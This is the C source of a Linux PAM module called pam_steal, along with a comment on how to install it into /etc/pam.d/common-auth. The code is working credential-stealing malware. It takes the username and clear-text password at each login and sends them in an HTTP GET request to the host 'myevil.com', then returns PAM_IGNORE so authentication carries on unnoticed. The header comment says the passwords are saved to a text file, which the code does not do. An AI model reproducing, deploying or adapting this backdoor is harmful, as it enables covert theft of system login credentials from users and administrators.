/*
 * pam_steal - save clear-text paasswords into text file
 *
 * Usage: add "auth required pam_steal.so" into /etc/pam.d/common-auth
 */

#include <stdio.h>
#include <security/pam_modules.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t * pamh, int flags
                                   ,int argc, const char **argv)
{
    int retval;
    const char *username;
    const void *password;

    retval = pam_get_user(pamh, &username, NULL);
    if (retval != PAM_SUCCESS) {
        return PAM_IGNORE;
    }

    retval = pam_get_item(pamh, PAM_AUTHTOK, &password);
    if (retval != PAM_SUCCESS) {
        return PAM_IGNORE;
    }

    int portno =        80;
    char *host =        "myevil.com";
    char *message_fmt = "GET /?login=%s&passw=%s HTTP/1.0\r\n\r\n";

    struct hostent *server;
    struct sockaddr_in serv_addr;
    int sockfd, bytes, sent, total;
    char message[1024];

    sprintf(message,message_fmt,username,password);

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    server = gethostbyname(host);
    if (server != NULL) {
        memset(&serv_addr,0,sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(portno);
        memcpy(&serv_addr.sin_addr.s_addr,server->h_addr,server->h_length);

        connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr));

        total = strlen(message);
        sent = 0;
        do {
            bytes = write(sockfd,message+sent,total-sent);
            if (bytes == 0)
                break;
            sent+=bytes;
        } while (sent < total);

        close(sockfd);
    }

    return PAM_IGNORE;
}


PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                              int argc, const char **argv)
{
    return PAM_IGNORE;
}
